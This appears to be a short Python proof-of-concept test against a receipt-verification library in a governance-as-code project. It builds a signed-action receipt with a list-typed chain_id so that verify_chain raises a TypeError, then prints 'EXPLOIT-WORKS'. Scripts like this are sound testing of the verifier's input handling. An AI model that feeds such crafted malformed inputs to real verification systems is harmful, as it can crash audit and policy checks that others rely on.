import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import generate_keypair, verify_chain

sk, pk = generate_keypair()

# We craft a receipt that causes verify_chain to crash
receipt = {
    "predicateType": "https://szl.dev/predicates/governed-action/v1",
    "subject": {"name": "x", "digest": {"sha256": "x"}},
    "predicate": {
        "action_id": "1",
        "actor": {"type": "human", "is_service_account": False, "human_principal": "alice", "auth_method": "mtls"},
        "policy_decision": {"result": "ALLOW", "policy_hash": "a"},
        "execution": {"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
        "timestamps": {"created": "2024-01-01T00:00:00Z", "executed": "2024-01-01T00:00:00Z", "ntp_synced": True},
        "evidence": {"items": [], "completeness": "COMPLETE"},
        "prev_chain_hash": "GENESIS",
        "chain_id": ["this", "will", "crash"]
    }
}

try:
    verify_chain([receipt], public_key=pk)
except TypeError as e:
    print("EXPLOIT-WORKS: Batch crash via unhashable chain_id")
